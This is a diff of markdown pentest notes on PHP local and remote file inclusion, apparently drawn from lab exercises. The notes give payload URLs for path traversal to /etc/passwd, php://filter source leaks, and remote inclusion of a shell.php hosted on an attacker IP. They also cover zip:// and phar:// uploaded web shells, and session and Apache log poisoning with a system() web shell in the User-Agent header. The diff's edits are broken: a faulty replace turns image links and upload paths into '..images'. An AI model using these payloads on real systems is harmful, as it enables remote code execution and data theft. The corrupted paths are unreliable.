@@ -54,7 +54,7 @@ http://94.237.49.23:48568/index.php?language=en.php
 http://94.237.49.23:48568/index.php?language=../../../../etc/passwd
 ```
 
-![Filtered output](.images/basic-lfi.png)
+![Filtered output](..images/basic-lfi.png)
 
 **Path traversal** is commonly used in LFI payloads in order to traverse up the directory-tree and back to the root directory. Traversal stops at the filesystem root, so including additional `../` sequences does not affect the final resolved path.
 
@@ -163,7 +163,7 @@ To find the approved path we can examine a legitimate request to see what path i
 http://83.136.253.59:34423/index.php?language=languages/en.php
 ```
 
-![Filtered output](.images/approved-path.png)
+![Filtered output](..images/approved-path.png)
 
 Approved path filters may be bypassed by prepending the approved path to the payload and then performing directory traversal from that location Approved path filters are often combined with a non-recursive search and replace filter and/or a character blacklist filter. **Including recursive payloads and/or URL encoding may be a good idea**.
 
@@ -273,7 +273,7 @@ php://filter/read=convert.base64-encode/resource=configure
 http://94.237.57.211:56084/index.php?language=php://filter/read=convert.base64-encode/resource=configure
 ```
 
-![Filtered output](.images/filter-wrapper.png)
+![Filtered output](..images/filter-wrapper.png)
 
 The returned base64 string can then be decoded:
 
@@ -282,7 +282,7 @@ The returned base64 string can then be decoded:
 echo '<string>' | base64 -d
 ```
 
-![Filtered output](.images/source-code.png)
+![Filtered output](..images/source-code.png)
 
 The `php://filter` does not provide code execution by itself, but is commonly used for information disclosure and source code analysis, which may lead to further exploitation.
 
@@ -313,7 +313,7 @@ Decode the returned base64 string:
 echo '<string>' | base64 -d
 ```
 
-![Filtered output](.images/allow-url-include.png)
+![Filtered output](..images/allow-url-include.png)
 
 The data wrapper can include base64-encoded PHP code that will be decoded and executed by the server.
 
@@ -449,7 +449,7 @@ http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=i
 http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=cd+../../../;ls
 ```
 
-![Filtered output](.images/basic-rfi.png)
+![Filtered output](..images/basic-rfi.png)
 
 ---
 
@@ -473,14 +473,14 @@ If the application later includes the uploaded file using a PHP include function
 
 To exploit this, the path to the uploaded file must be known. In many cases, the upload path can be inferred from the URL or by inspecting the page source.
 
-![Filtered output](.images/file-path.png)
+![Filtered output](..images/file-path.png)
 
 With the path known, the file can be included via the LFI vulnerability and commands can be passed through the `cmd` parameter.
 
 **Example:**
 
 ```bash
-http://94.237.55.43:48679/index.php?language=./profile_.images/shell.gif&cmd=id
+http://94.237.55.43:48679/index.php?language=./profile_..images/shell.gif&cmd=id
 ```
 
 ---
@@ -510,11 +510,11 @@ zip://<path_to_zip>%23<file_inside_zip>
 The # character must be URL encoded as %23.
 
 ```bash
-http://94.237.55.43:48679/index.php?language=zip://./profile_.images/shell.jpg%23shell.php&cmd=id
+http://94.237.55.43:48679/index.php?language=zip://./profile_..images/shell.jpg%23shell.php&cmd=id
 ```
 
 ```bash
-http://94.237.61.242:42157/index.php?language=zip://./profile_.images/shell.jpg%23shell.php&cmd=cd+../../../;cat+/etc/passwd
+http://94.237.61.242:42157/index.php?language=zip://./profile_..images/shell.jpg%23shell.php&cmd=cd+../../../;cat+/etc/passwd
 ```
 
 ---
@@ -554,7 +554,7 @@ mv shell.phar shell.jpg
 Upload the file and include the embedded PHP file via the `phar://` wrapper:
 
 ```bash
-http://94.237.61.242:42157/index.php?language=phar://./profile_.images/shell.jpg%2Fshell.txt&cmd=id
+http://94.237.61.242:42157/index.php?language=phar://./profile_..images/shell.jpg%2Fshell.txt&cmd=id
 ```
 
 ---
@@ -582,7 +582,7 @@ C:\Windows\Temp\sess_el4ukv0kqbvoirg7nkp4dncpk3
 
 When intercepting a request in BurpSuite, the **PHPSESSID** is visible in the request:
 
-![Filtered output](.images/php-sess-id.png)
+![Filtered output](..images/php-sess-id.png)
 
 **Step 1:**
 
@@ -592,7 +592,7 @@ Attempt to read the **PHPSESSID** through LFI:
 http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic
 ```
 
-![Filtered output](.images/php-sess-id-lfi.png)
+![Filtered output](..images/php-sess-id-lfi.png)
 
 We can indeed read the **PHPSESSID** log file.
 
@@ -609,7 +609,7 @@ http://94.237.48.12:41125/index.php?language=log_poisoning
 http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic
 ```
 
-![Filtered output](.images/log-poisoning.png)
+![Filtered output](..images/log-poisoning.png)
 
 The value is reflected in the session file. PHP automatically stores request parameters and session data inside the session file, which makes it possible to inject executable PHP code.
 
@@ -637,7 +637,7 @@ Include the session file in an LFI and execute commands through the `cmd` parame
 http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic&cmd=id
 ```
 
-![Filtered output](.images/log-poisoning2.png)
+![Filtered output](..images/log-poisoning2.png)
 
 Keep in mind that the session file is rewritten on subsequent requests, overwriting the injected payload. To execute another command the log file has to be re-poisoned with the web shell.
 
@@ -679,7 +679,7 @@ Attempt to include log file through LFI:
 http://94.237.54.192:55031/index.php?language=../../../var/log/apache2/access.log
 ```
 
-![Filtered output](.images/log-poisoning3.png)
+![Filtered output](..images/log-poisoning3.png)
 
 We can indeed read the `access.log` file.
 
@@ -691,11 +691,11 @@ Intercept the request in BurpSuite. Modify the **User-Agent** header to see if i
 User-Agent: Apache Log Poisoning
 ```
 
-![Filtered output](.images/user-agent-header.png)
+![Filtered output](..images/user-agent-header.png)
 
 It is indeed reflected in the log file:
 
-![Filtered output](.images/user-agent-header2.png)
+![Filtered output](..images/user-agent-header2.png)
 
 **Step 3:**
 
@@ -705,7 +705,7 @@ Inject a web shell into the **User-Agent** header:
 User-Agent: <?php system($_GET["cmd"]);?>
 ```
 
-![Filtered output](.images/user-agent-header3.png)
+![Filtered output](..images/user-agent-header3.png)
 
 **Step 4:**
 
@@ -717,5 +717,5 @@ index.php?language=../../../var/log/apache2/access.log&cmd=id
 
 Because PHP executes any included file regardless of its original purpose, injected PHP code inside log files is interpreted and executed.
 
-![Filtered output](.images/user-agent-header4.png)
+![Filtered output](..images/user-agent-header4.png)
 
